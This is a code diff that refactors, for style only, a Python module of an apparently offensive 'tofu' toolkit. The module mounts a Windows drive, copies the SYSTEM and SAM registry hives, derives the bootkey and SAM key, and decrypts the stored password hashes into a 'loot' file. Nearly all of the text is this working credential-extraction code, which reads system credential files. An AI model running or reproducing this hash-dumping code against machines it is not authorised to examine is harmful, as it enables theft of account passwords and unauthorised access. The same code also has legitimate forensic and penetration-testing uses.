@@ -71,9 +71,7 @@ class RegHive(object):
 
     def __read_hr(self, offset, index):
         offset += 8 * index
-        hr = HASH_RECORD._make(unpack('i4s', self.__base[offset:offset+8]))
-
-        return hr
+        return HASH_RECORD._make(unpack('i4s', self.__base[offset:offset+8]))
 
     def __parself(self, t, offset):
         l = self.__read_lf(offset)
@@ -93,7 +91,7 @@ class RegHive(object):
 
     def __read_valuelist(self, n):
         offset, size = n.value_off, n.value_cnt
-        return unpack('%si' % size, self.__base[offset + 4:offset + 4 + size*4])
+        return unpack(f'{size}i', self.__base[offset + 4:offset + 4 + size*4])
 
     def __read_data(self, offset, size):
         return self.__base[offset+4:offset+4+size]
@@ -138,8 +136,7 @@ def str_to_key(s):
     return bytes(map(lambda k: ODD_PARITY[k<<1], key))
 
 def sid_to_key(sid):
-    s1 = ""
-    s1 += chr(sid & 0xFF)
+    s1 = f"{chr(sid & 255)}"
     s1 += chr((sid>>8) & 0xFF)
     s1 += chr((sid>>16) & 0xFF)
     s1 += chr((sid>>24) & 0xFF)
@@ -156,17 +153,14 @@ def decrypt_single_hash(rid, hbootkey, enc_hash, apwd):
 
     rc4_key = MD5.new(hbootkey[:0x10] + pack('<L', rid) + apwd).digest()
     obfkey = ARC4.new(rc4_key).encrypt(enc_hash)
-    hash = d1.decrypt(obfkey[:8]) + d2.decrypt(obfkey[8:])
-
-    return hash
+    return d1.decrypt(obfkey[:8]) + d2.decrypt(obfkey[8:])
 
 def get_current_controlSet(registry_hive):
     n = registry_hive.regOpenKey(b'Select')
     currentControlSet = ''
 
     for source in [b'Current', b'Default']:
-        controlSet = registry_hive.regQueryValue(n, source)
-        if controlSet:
+        if controlSet := registry_hive.regQueryValue(n, source):
             currentControlSet = b'ControlSet%03d\\Control\\Lsa\\' % controlSet
             break
 
@@ -184,13 +178,11 @@ def get_bootkey(bootkeyFile):
         bootkey += rr
 
     bootkey = binascii.unhexlify(str(object=bootkey, encoding='utf-16-le'))
-    bootkey_scrambled = bytes(map(lambda i: bootkey[PERMUTATION_MATRIX[i]], range(len(bootkey))))
-    return bootkey_scrambled
+    return bytes(
+        map(lambda i: bootkey[PERMUTATION_MATRIX[i]], range(len(bootkey)))
+    )
 
 def get_hbootkey(h, sys_key):
-    aqwerty = b'!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00'
-    anum = b'0123456789012345678901234567890123456789\x00'
-
     regaccountkey = b'SAM\\Domains\\Account'
 
     # Open SAM\\SAM\\Domains\\Account key
@@ -198,7 +190,7 @@ def get_hbootkey(h, sys_key):
     domain_account_f = h.regQueryValue(n, b"F")
 
     #print(domain_account_f.hex())
-    if domain_account_f[0] != 2 and domain_account_f[0] != 3:
+    if domain_account_f[0] not in [2, 3]:
         raise Exception(f'Unknow F revision {domain_account_f[0]}')
 
     keys1 = domain_account_f[0x68:0xA8]
@@ -206,16 +198,16 @@ def get_hbootkey(h, sys_key):
     if keys1[0] == 0x01:
         # hash the sys_key
         key1_salt = keys1[0x08:0x18]
-        rc4_key = MD5.new(key1_salt + aqwerty + sys_key + anum).digest()
-        sam_key = ARC4.new(rc4_key).encrypt(keys1[0x18:0x28])
-        return sam_key
+        aqwerty = b'!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%\x00'
+        anum = b'0123456789012345678901234567890123456789\x00'
 
+        rc4_key = MD5.new(key1_salt + aqwerty + sys_key + anum).digest()
+        return ARC4.new(rc4_key).encrypt(keys1[0x18:0x28])
     elif keys1[0] == 0x02:
         aes_salt = keys1[0x10:0x20]
         aes_data = keys1[0x20:0x30]
         aes = AES.new(sys_key, AES.MODE_CBC, iv=aes_salt)
-        sam_key = aes.decrypt(aes_data)
-        return sam_key
+        return aes.decrypt(aes_data)
     else:
         raise Exception(f'Unknown Struct Key revision {keys1[0]}')
 
@@ -288,49 +280,49 @@ def get_hashes(h, sam_key):
 
 
 def __main__(drive_name,drive_format):
-	if drive_format == "BITLOCKER ENCRYPTED DRIVE":
-		print("[-] This module does not work with a Bitlocker drive")
-	elif drive_name == None:
-		print("[-] This module needs a drive to work; use 'usedrive'")
-	else:
-		if not os.path.exists("tofu_tmp/windows_filesystem"):
-			os.mkdir("tofu_tmp/windows_filesystem")
-		else:
-			try:
-				# quick clean up incase another script forgot to unmount the filesystem
-				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
-			except:
-				pass
-		print("[#] Preparing hash file at 'tofu_loot/hashes.txt'")
-		try:
-			open("tofu_loot/hashes.txt",'x').close()
-		except FileExistsError:
-			pass
+    if drive_format == "BITLOCKER ENCRYPTED DRIVE":
+        print("[-] This module does not work with a Bitlocker drive")
+    elif drive_name is None:
+        print("[-] This module needs a drive to work; use 'usedrive'")
+    else:
+        if not os.path.exists("tofu_tmp/windows_filesystem"):
+        	os.mkdir("tofu_tmp/windows_filesystem")
+        else:
+        	try:
+        		# quick clean up incase another script forgot to unmount the filesystem
+        		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
+        	except:
+        		pass
+        print("[#] Preparing hash file at 'tofu_loot/hashes.txt'")
+        try:
+        	open("tofu_loot/hashes.txt",'x').close()
+        except FileExistsError:
+        	pass
 
-		subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
-		print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
-		try:
-			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
-			shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
-			time.sleep(2)
-			try:
-				subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
-				print("[+] Successfully unmounted")
-			except Exception as unmount_error:
-				print(f"Error Unmounting : {unmount_error}")
-			bootkey = get_bootkey("tofu_tmp/HASHDUMP_SYSTEM")
-			print(f"[+] Bootkey {bootkey}")
-			registry_hive = RegHive("tofu_tmp/HASHDUMP_SAM")
-			domain_key = get_hbootkey(registry_hive,bootkey)
-			print(f"[+] SAM Key : {domain_key}")
-			print("===================================================")
+        subprocess.check_call(["mount",drive_name,"tofu_tmp/windows_filesystem"])
+        print("[+] Drive mounted to 'tofu_tmp/windows_filesystem'")
+        try:
+        	shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SYSTEM","tofu_tmp/HASHDUMP_SYSTEM")
+        	shutil.copy("tofu_tmp/windows_filesystem/Windows/System32/config/SAM","tofu_tmp/HASHDUMP_SAM")
+        	time.sleep(2)
+        	try:
+        		subprocess.check_call(["umount","tofu_tmp/windows_filesystem"])
+        		print("[+] Successfully unmounted")
+        	except Exception as unmount_error:
+        		print(f"Error Unmounting : {unmount_error}")
+        	bootkey = get_bootkey("tofu_tmp/HASHDUMP_SYSTEM")
+        	print(f"[+] Bootkey {bootkey}")
+        	registry_hive = RegHive("tofu_tmp/HASHDUMP_SAM")
+        	domain_key = get_hbootkey(registry_hive,bootkey)
+        	print(f"[+] SAM Key : {domain_key}")
+        	print("===================================================")
 
-			get_hashes(registry_hive,domain_key)
-			try:
-				os.remove("tofu_tmp/HASHDUMP_SYSTEM")
-				os.remove("tofu_tmp/HASHDUMP_SAM")
-			except Exception as delete_error:
-				print(f"[-] Error while deleting temporary files : {delete_error}")			
-			print("[+] Hashes saved to 'tofu_loot/hashes.txt'")
-		except Exception as open_error:
-			print(f"[-] Error {open_error}")
+        	get_hashes(registry_hive,domain_key)
+        	try:
+        		os.remove("tofu_tmp/HASHDUMP_SYSTEM")
+        		os.remove("tofu_tmp/HASHDUMP_SAM")
+        	except Exception as delete_error:
+        		print(f"[-] Error while deleting temporary files : {delete_error}")			
+        	print("[+] Hashes saved to 'tofu_loot/hashes.txt'")
+        except Exception as open_error:
+        	print(f"[-] Error {open_error}")
